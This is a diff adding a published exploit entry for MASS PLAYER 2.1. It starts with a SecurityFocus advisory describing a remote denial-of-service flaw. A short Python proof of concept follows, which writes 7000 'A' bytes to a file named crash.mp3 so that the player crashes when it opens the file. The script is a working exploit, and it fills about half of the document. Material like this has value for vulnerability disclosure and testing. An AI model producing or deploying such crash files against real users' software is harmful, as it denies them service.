@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/44220/info
+
+MASS PLAYER is prone to a remote denial-of-service vulnerability.
+
+An attacker can exploit this issue to cause the affected application to crash, denying service to legitimate users.
+
+MASS PLAYER 2.1 is vulnerable; other versions may also be affected. 
+
+#Exploit Title :MASS PLAYER 2.1 Denial of service vulnerability
+#Software : MASS PLAYER 2.1
+#Software link :http://sourceforge.net/projects/massmusicplayer/
+#Autor : Sweet
+#Email : charif38@hotmail.fr
+#Date  : 19/10/2010
+#Software version : 2.1
+#Tested on : WinXP sp3 ENG
+#!/usr/bin/python
+#thx to Milw0rm.com , JF - Hamst0r - Keystroke) R.I.P  , inj3ct0r.com ,  exploit-db.com, packetstormsecurity.org, http://ha.ckers.org
+#et 1,2,3 viva L'Algerie
+outfile="crash.mp3"
+junk="\x41" * 7000
+FILE=open(outfile, "w")
+FILE.write(junk)
+FILE.close()
